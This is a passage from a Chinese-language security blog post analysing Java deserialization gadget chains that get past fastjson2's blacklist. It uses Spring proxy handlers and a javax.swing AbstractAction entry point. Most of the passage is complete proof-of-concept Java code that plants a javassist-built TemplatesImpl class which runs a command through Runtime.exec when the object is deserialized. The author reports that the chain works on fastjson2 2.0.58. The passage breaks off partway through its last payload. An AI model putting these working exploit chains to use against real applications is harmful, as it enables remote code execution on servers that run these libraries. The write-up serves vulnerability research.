javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.springframework.aop.framework.AdvisedSupport; import javax.xml.transform.Templates; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Class\u0026lt;?\u0026gt; clazz = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;); Constructor\u0026lt;?\u0026gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templates); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;, proxyObj); jsonObject.toString(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 运行弹出计算机。然后在分析调试的过程中，发现还是和自己分析的过程不一样，重点在BeanUtils#getter()中，如下：\n这里很容易看出来就是判断这里是否为代理类，如果是的话就获取接口然后再次调用getter方法，当时简单跟了一下以为会判定为false，结果差点就功亏一篑呀，根据调试继续跟进：\n跟进isProxyClass()方法：\n前面会判定为true不奇怪，proxyClassCache变量定义如下：\n想当然以为containsValue()方法就是看是否包含对应的值，其实并不是，这里会包含，代码比较简单就不跟进了，还是要看类中的代码呀。故这里会进入到if语句中获取对应代理类的接口：\n后续的过程基本就清楚了，就是让objectClass变为了Templates.class，再次调用getter方法，幸好黑名单里面没有Templates.class，也就对应上了参考文章里说Templates.class没有上黑名单由此想出的这个绕过，然后获取其Method，然后创建fieldWriterMap并调用wirte()方法进行序列化从而触发到JdkDynamicAopProxy类的invoke()方法从而进行命令执行：\n但是在这里的Proxy.isProxyClass()的判断中，可以注意到这里的if条件。要求interfaces只能为一个，那么我是否可以让interfaces为两个或更多，来让objectClass不会改变，从而在proxy.getClass().getMethods()这里来获取到对应方法并进行后续处理呢，简单尝试如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package org.example; import com.alibaba.fastjson2.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.springframework.aop.framework.AdvisedSupport; import javax.xml.transform.Templates; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Class\u0026lt;?\u0026gt; clazz = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;); Constructor\u0026lt;?\u0026gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templates); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class,AutoCloseable.class}, handler); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;, proxyObj); jsonObject.toString(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 运行同样可以弹出计算机。我这里是在接口处加了一个AutoCloseable.class，让接口获取不再是一个：\n从而在ignore()判断中返回false：\n从而继续后续调用链的进行来调用到write()方法。所以从这里来看，至少需要同时ban掉Templates和com.sun.proxy.$Proxy0才能完全禁止反序列化调用链的进行，看后面绕过还用不用得到。\n经测试到目前最新的2.0.58版本都能使用只有Templates.class的链子打，就看后续会怎么修复吧。\n并且后面版本的fastjson的黑名单变成了hash值计算的结果，而且加密逻辑都在代码中有体现。\n最后可以用来序列化攻击的poc如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 package org.example; import com.alibaba.fastjson2.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.springframework.aop.framework.AdvisedSupport; import javax.management.BadAttributeValueExpException; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Class\u0026lt;?\u0026gt; clazz = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;); Constructor\u0026lt;?\u0026gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templates); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;, proxyObj); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, jsonObject); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 并且两个接口类的也可以用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 package org.example; import com.alibaba.fastjson2.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.springframework.aop.framework.AdvisedSupport; import javax.management.BadAttributeValueExpException; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Class\u0026lt;?\u0026gt; clazz = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;); Constructor\u0026lt;?\u0026gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templates); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class,AutoCloseable.class}, handler); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;, proxyObj); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, jsonObject); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } ————————\nObjectFactoryDelegatingInvocationHandler+JSONObject链 这个类是一个内部类，实现了InvocationHandler和Serializable两个接口，在spring-beans依赖中，而spring-aop中本身就拉入了spring-beans依赖：\n所以也是可以说spring中都能打的。\n跟进这个类的invoke()方法：\n非常清晰了，只是需要代理类调用getOutputProperties，这个好解决，代理类设置Templates.class接口即可，再看一下是否有可利用的ObjectFactory类，这是一个接口类，但是并没有合适的重写的方法，但是看参考文章，利用了JSONObject类的invoke()方法：\n这个类也能被代理，跟进它的invoke()方法：\n先获取方法名，然后方法参数个数，后续跟进的代码应该是如下：\n可以知道参数个数为0，然后对getter方法进行处理，然后调用get()方法来进行获取值：\n跟进发现其实就是LinkedHashMap中取值，直接往里面放入一个键值对即可。\n最后的poc如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 package org.example; import com.alibaba.fastjson2.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.springframework.aop.framework.AdvisedSupport; import org.springframework.beans.factory.ObjectFactory; import javax.management.BadAttributeValueExpException; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); //第一个JSONObject代理 JSONObject jsonObject0 = new JSONObject(); jsonObject0.put(\u0026#34;object\u0026#34;,templates); Object proxy0 = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{ObjectFactory.class},(InvocationHandler)jsonObject0); //第二个代理 Constructor constructor = Class.forName(\u0026#34;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler\u0026#34;).getDeclaredConstructor(ObjectFactory.class); constructor.setAccessible(true); Object proxy1 = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Templates.class},(InvocationHandler)constructor.newInstance(proxy0)); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;, proxy1); //toString BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, jsonObject); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 运行在反序列化时弹出计算机，并且调试符合前面的过程。\n同样是可以使用两个接口来进行前面所述的利用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 package org.example; import com.alibaba.fastjson2.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.springframework.aop.framework.AdvisedSupport; import org.springframework.beans.factory.ObjectFactory; import javax.management.MBeanServer; import javax.management.BadAttributeValueExpException; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); //第一个SONObject代理 JSONObject jsonObject0 = new JSONObject(); jsonObject0.put(\u0026#34;object\u0026#34;,templates); Object proxy0 = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{ObjectFactory.class},(InvocationHandler)jsonObject0); //第二个代理 Constructor constructor = Class.forName(\u0026#34;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler\u0026#34;).getDeclaredConstructor(ObjectFactory.class); constructor.setAccessible(true); Object proxy1 = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Templates.class,AutoCloseable.class},(InvocationHandler)constructor.newInstance(proxy0)); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;, proxy1); //toString BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, jsonObject); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 这样就同样需要ban掉Templates和com.sun.proxy.$Proxy1才能完全限制。\n同样在最新版本2.0.58也能打。\n非常好的绕过方式，可惜大部分情况应该都是只能在spring下打，当然如参考文章一样，还可以尝试打没ban的类，而不是就磕TemplatesImpl，比如我的c3p0分析文章就有一个反序列化打jndi。\n新的反序列化toString入口类 基本说明 在先知文章看到的一个新的入口点：\nhttps://xz.aliyun.com/news/18467\n文中提到的链子如下：\n1 2 3 4 javax.swing.AbstractAction#readObject -\u0026gt; javax.swing.AbstractAction#putValue -\u0026gt; javax.swing.AbstractAction#firePropertyChange -\u0026gt; java.lang.Object#equals 可以发现使用了Object#equals()方法，虽然跟进发现确实是可以的：\n但是这个类并没有实现Serializable接口，所以并不可以序列化，再看后续的文中的链子，其实还是使用的XString，所以这里只是换了一个入口类而已，当HashMap、Hashtable、HashSet等类都被ban了可以来用这个类（注意后续链子的类是否被ban，这些都是需要考虑的），但是都绕不开一个点就是XString，所以其实这里的链子是如下的：\n1 2 3 4 javax.swing.AbstractAction#readObject -\u0026gt; javax.swing.AbstractAction#putValue -\u0026gt; javax.swing.AbstractAction#firePropertyChange -\u0026gt; com.sun.org.apache.xpath.internal.objects.XString#equals 先来跟一下基本的链子：\nAbstractAction类的readObject()方法：\n再跟进putValue()方法：\n再看firePropertyChange()方法：\n很明显了，这里就是要让oldValue为为String，让newValue为例如JSONObject这种要利用其toString方法的类。\n再看writeObject()方法：\n整个过程都是与arrayTable变量相关的：\n由于实现了transient，故在writeObject()方法中实现了对这个变量的序列化。并且与反序列化时的putValue()也是对应的。\n基本过程已经清楚，现在来尝试构造。\n尝试构造 首先可以看到AbstractAction是一个抽象类，不能直接序列化，需要找它的实现类来作为入口点：\n这里就直接同参考文章一样用AlignmentAction类作为入口，这里应该第二个ActivateLinkAction应该也可以用，具体就到时候看有无黑名单吧。\n来看AlignmentAction的构造函数：\n这里会一直向上传递String类型的nm参数，直到AbstractAction类的“实例化”：\nNAME变量定义如下：\n故这里会在实例化时就放进去一个键值对。\n这里有一个不得不说的逻辑，且看慢慢道来，先看AbstractAction类的putValue()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public void putValue(String key, Object newValue) { Object oldValue = null; if (key == \u0026#34;enabled\u0026#34;) { if (newValue == null || !(newValue instanceof Boolean)) { newValue = false; } oldValue = enabled; enabled = (Boolean)newValue; } else { if (arrayTable == null) { arrayTable = new ArrayTable(); } if (arrayTable.containsKey(key)) oldValue = arrayTable.get(key); // Remove the entry for key if newValue is null // else put in the newValue for key. if (newValue == null) { arrayTable.remove(key); } else { arrayTable.put(key,newValue); } } firePropertyChange(key, oldValue, newValue); } 毫无疑问这里主要的逻辑就是：\n1 2 3 arrayTable = new ArrayTable(); arrayTable.put(key,newValue); firePropertyChange(key, oldValue, newValue); 也就是放入键值对并进行比较的问题。从代码逻辑可以看出，每次putValue后都会调用一次firePropertyChange()方法：\n这里有一个非常关键的逻辑：||（逻辑或），也就是只要左边为true，右边就不会再进行计算，整个条件就会被判定为真。所以在序列化前放入键值对无影响，但是反序列化时需要有这个变量，故我在序列化前调用反射修改值即可，并且什么，还可以防止在序列化前第二次调用putValue()方法放进值时触发euqlas()方法从而弹出计算机，原因很好理解了就不多说了。\n跟进changeSupport变量的定义：\n找到对应的SwingPropertyChangeSupport类：\n故我反射修改变量changeSupport为这个类实例即可。\n并且在putValue()方法的代码逻辑中，可以看到要是newValue == null，arrayTable就会删除对应的键值对，所以其实虽然“实例化”时放入了一个键值对，我们这里通过调用putValue(\u0026quot;Name\u0026quot;,null)直接删除即可。\n故可以简单尝试构造如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 package org.example; import com.alibaba.fastjson2.JSONObject; import javax.xml.transform.Templates; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.springframework.aop.framework.AdvisedSupport; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import com.sun.org.apache.xpath.internal.objects.XString; import javax.swing.text.StyledEditorKit; import javax.swing.event.SwingPropertyChangeSupport; import java.util.HashMap; public class Main{ public static void main(String[] args) throws Exception { ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Class\u0026lt;?\u0026gt; clazz = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;); Constructor\u0026lt;?\u0026gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templates); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;, proxyObj); XString xstring = new XString(\u0026#34;fupanc1233\u0026#34;); StyledEditorKit.AlignmentAction alignmentAction = new StyledEditorKit.AlignmentAction(\u0026#34;123\u0026#34;,1); alignmentAction.putValue(\u0026#34;Name\u0026#34;,null); alignmentAction.putValue(\u0026#34;fupanc1\u0026#34;,xstring); alignmentAction.putValue(\u0026#34;fupanc2\u0026#34;,jsonObject); //任意可序列化的类作为参数都行 HashMap hashMap = new HashMap(); SwingPropertyChangeSupport swingPropertyChangeSupport = new SwingPropertyChangeSupport(hashMap); setFieldValue(alignmentAction,\u0026#34;changeSupport\u0026#34;, swingPropertyChangeSupport); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(alignmentAction); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { Class\u0026lt;?\u0026gt; clazz = obj.getClass(); Field field = null; while (clazz != null) { try { field = clazz.getDeclaredField(fieldName); break; } catch (NoSuchFieldException e) { clazz = clazz.getSuperclass(); } } if (field == null) { throw new NoSuchFieldException(\u0026#34;Field \u0026#39;\u0026#34; + fieldName + \u0026#34;\u0026#39; not found in class hierarchy.\u0026#34;); } field.setAccessible(true); field.set(obj, value); } } 未成功，打断点调试一下，发现是我想当然了，主要问题点存在这里：\n从调试过程看，确实成功放入了两个键值对，但是在第二次调用putValue()方法时，如图可见oldValue的值竟然为null，这一部分确实是我之前疏忽的，这里的oldValue取值的get(key)的key是和newValue的key是一样的，所以导致在反序列化时并没有对应的值而使得oldValue值为null，但是我们并不能在序列化前放入key相同的两个键值对，简单跟进Arraytable类的put()方法：\n很容易知道如果key重复就会入上面方框的代码会让先放进的值被覆盖掉，否则就是下面这个可以放进去两个值。\n但是师傅给出了一个非常妙的思路，就是先像前面一样放进去两个值，然后再在16进制编辑器里修改第一个键值对的key为第二个键值对的key（尝试过直接修改文件，会报格式错误，所以还是用编辑器来改吧）。并且再看一下反序列化流程，是完全可行的：\n虽然在调用arrayTable.put()还是会覆盖，但是我们已经获取到了oldValue，也就是可控的XString类实例，那么这里在调用firePropertyChange就完全符合前面的链子了，所以最后的payload如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 package org.example; import com.alibaba.fastjson2.JSONObject; import javax.xml.transform.Templates; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.springframework.aop.framework.AdvisedSupport; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import com.sun.org.apache.xpath.internal.objects.XString; import javax.swing.text.StyledEditorKit; import javax.swing.event.SwingPropertyChangeSupport; import java.util.HashMap; public class Main{ public static void main(String[] args) throws Exception { ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; 